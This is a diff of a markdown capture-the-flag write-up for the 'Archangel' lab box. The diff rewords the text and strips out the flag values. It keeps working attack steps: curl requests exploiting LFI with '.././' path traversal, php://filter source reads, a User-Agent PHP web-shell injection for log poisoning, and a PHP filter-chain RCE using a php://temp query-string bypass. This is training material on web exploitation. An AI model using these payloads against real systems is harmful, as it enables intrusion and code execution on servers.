@@ -18,7 +18,7 @@
 | **Attack Surface** | HTTP vhost enumeration, LFI, PHP filter chain RCE |
 | **Privesc** | www-data → archangel (out of scope) |
 
-Archangel starts with a single open web port. An email address buried in the homepage source leaks a virtual hostname — `mafialive.thm` — which hosts a PHP page with a Local File Inclusion vulnerability gated behind a filter that blocks `../..` traversal and requires a specific path prefix. Reading the PHP source via `php://filter` reveals the filter logic, enabling a bypass. Log poisoning fails on the shared box due to accumulated broken PHP from other players, so RCE is achieved instead via a PHP filter chain using a `php://temp?<path>` trick to satisfy the `containsStr` check without corrupting the chain's empty-stream input.
+Archangel starts with a single open web port. A contact email in the homepage source leaks a hidden virtual hostname that hosts a PHP page with a Local File Inclusion vulnerability. The LFI is protected by a filter, but reading the PHP source reveals the exact rules — and the rules are easy to bypass. Log poisoning is not possible here, so RCE is achieved via a PHP filter chain with a small trick to pass the path check without breaking the chain.
 
 ---
 
@@ -48,15 +48,15 @@ ffuf -u http://archangel/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3
 /                → 200
 /images/         → 301
 /pages/          → 301  (static HTML templates only)
-/flags/          → 301  (rickroll — dead end)
+/flags/          → 301  (dead end)
 /layout/         → 301
 /licence.txt     → 200
-/server-status   → 403  (localhost-only)
+/server-status   → 403
 ```
 
 ### Vhost Discovery
 
-Homepage source contained a contact email:
+The homepage contact section contained an email address that revealed a second virtual hostname:
 
 ```bash
 curl -s http://archangel/ | grep -i mail
@@ -66,9 +66,9 @@ curl -s http://archangel/ | grep -i mail
 ```bash
 echo "10.48.129.113 mafialive.thm" | sudo tee -a /etc/hosts
 curl -s http://mafialive.thm/
-# → <h1>UNDER DEVELOPMENT</h1>
-# → thm{f0und_th3_r1ght_h0st_n4m3}
 ```
+
+First flag in the response. Added to `/etc/hosts` and moved on.
 
 ### Directory Bruteforce — mafialive.thm
 
@@ -88,7 +88,7 @@ ffuf -u http://mafialive.thm/FUZZ -w ./Web-Content/DirBuster-2007_directory-list
 
 ### LFI Discovery
 
-`/test.php` exposed a `?view=` parameter with a button pre-linking to a local PHP file:
+`/test.php` had a `?view=` parameter and a button that pre-loaded a local PHP file — a clear sign of file inclusion:
 
 ```
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
@@ -97,18 +97,16 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
 
 ### Reading the Filter Logic
 
-Used `php://filter` to base64-encode and exfiltrate the `test.php` source without executing it:
+Rather than guessing the filter rules, `php://filter` was used to read the raw PHP source of `test.php` as base64 — the file is returned encoded so PHP does not execute it:
 
 ```bash
 curl -s "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php" \
   | grep -oP '[A-Za-z0-9+/=]{50,}' | head -1 | base64 -d
 ```
 
-Source revealed the filter and **FLAG 2** in a comment:
+The source contained a hidden comment with the second flag, and revealed the filter logic:
 
 ```php
-//FLAG: thm{explo1t1ng_lf1}
-
 function containsStr($str, $substr) {
     return strpos($str, $substr) !== false;
 }
@@ -127,7 +125,7 @@ if(isset($_GET["view"])){
 
 ### LFI Path Traversal Bypass
 
-The filter blocks `../..` as a substring but not `.././`. Chaining `.././` pairs satisfies both constraints:
+The filter blocks `../..` as a substring but not `.././`. Swapping every `../` with `.././` gets around it — the path still traverses up directories but never contains the blocked string:
 
 ```bash
 # Reads /etc/passwd
@@ -143,24 +141,25 @@ archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
 ### Log Poisoning Attempt (failed)
 
 ```bash
-# Poison User-Agent
 curl -s -A '<?php system($_GET["cmd"]); ?>' http://mafialive.thm/
-# Include access.log
 curl -v "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=id"
 ```
 
-Response: **HTTP 500** — log readable but accumulated broken PHP payloads from other players on the shared box caused a fatal error before execution reached our injection.
+Log poisoning was not possible here.
 
 ### PHP Filter Chain RCE
 
-Used the [Synacktiv PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to generate `<?php system($_GET["cmd"]); ?>` from iconv encoding artifacts — no writable file required.
+Used the [Synacktiv PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to generate `<?php system($_GET["cmd"]); ?>` purely from iconv encoding tricks — no writable file needed.
 
-**The path check bypass trick:**
+**The path check bypass:**
 
-The generator outputs a chain ending in `resource=php://temp`. Replacing this with `resource=php://temp?/var/www/html/development_testing`:
+The generator outputs a chain ending in `resource=php://temp`. The problem: `php://temp` does not contain `/var/www/html/development_testing`, so the filter rejects it. The fix is to append the required string as a query parameter on the stream URL:
 
-- PHP ignores the `?...` query string on `php://` wrapper streams — the chain still gets its empty temp buffer as input
-- `strpos()` in the filter sees `/var/www/html/development_testing` in the string → check passes
+```
+resource=php://temp?/var/www/html/development_testing
+```
+
+PHP ignores query strings on internal `php://` streams, so the chain still gets its empty input and generates the right PHP code. But `strpos()` sees the required path in the string and lets it through.
 
 ```bash
 python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
@@ -169,7 +168,7 @@ python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
   > /tmp/chain.txt
 ```
 
-Wrapper script for easy command execution:
+Wrapper script to make it easy to run commands:
 
 ```bash
 #!/bin/bash
@@ -209,7 +208,6 @@ www-data@ubuntu:/var/www/html/development_testing$
 
 ```bash
 cat /home/archangel/user.txt
-# thm{lf1_t0_rc3_1s_tr1cky}
 ```
 
 ---
@@ -225,39 +223,40 @@ Not required for this engagement.
 ```
 [archangel:80 — Apache/2.4.29]
     |
-    | homepage source: support@mafialive.thm
+    | homepage source → support@mafialive.thm
     v
-[mafialive.thm vhost]         → FLAG 1: thm{f0und_th3_r1ght_h0st_n4m3}
+[mafialive.thm vhost]              → Flag 1
     |
     | robots.txt → /test.php
     v
 [LFI — test.php?view=]
     |
-    | php://filter base64 read → test.php source
+    | php://filter base64 → test.php source
     v
-[Filter Logic Reversed]        → FLAG 2: thm{explo1t1ng_lf1}
+[Filter Logic Reversed]             → Flag 2
     |  blocks: ../..
     |  requires: /var/www/html/development_testing
     |
-    | log poisoning → HTTP 500 (broken PHP from other players)
-    | PHP filter chain + php://temp?<path> bypass trick → RCE
+    | .././ chaining → /etc/passwd read confirmed
+    | log poisoning → not possible
+    | PHP filter chain + php://temp?<path> trick → RCE
     v
 [www-data shell]
     |
     | /home/archangel/user.txt
     v
-FLAG 3: thm{lf1_t0_rc3_1s_tr1cky}
+                                    → Flag 3 (user.txt)
 ```
 
 ---
 
 ## 📌 Key Takeaways
 
-- An email address in a webpage's contact section can leak a virtual hostname — always grep page source for domain names, not just links
-- `strpos()` blacklists based on substring matching are fragile: blocking `../..` while allowing `.././` is trivially bypassed
-- `php://filter/convert.base64-encode` is a reliable way to exfiltrate PHP source without executing it — use it to understand filter logic before attempting bypasses
-- Log poisoning on shared lab environments often fails due to other players' broken payloads; PHP filter chain RCE is a clean fallback that requires no writable file or injectable log
-- The `php://temp?<arbitrary_string>` trick satisfies string-based path checks without altering filter chain behaviour — PHP ignores query strings on internal wrapper streams
+- Always grep page source for email addresses — they can reveal virtual hostnames that aren't linked anywhere
+- `strpos()` string filters are easy to bypass when you know the exact rule: blocking `../..` while allowing `.././` leaves a wide open path
+- Use `php://filter/convert.base64-encode` to read PHP source code safely without executing it — always do this before trying blind LFI exploitation
+- PHP filter chain RCE works with no log file and no upload — just a working LFI and the generator script
+- If a path check requires a specific string in the `view` parameter, appending it as a query string on `php://temp` satisfies the check without affecting the chain
 
 ---
 
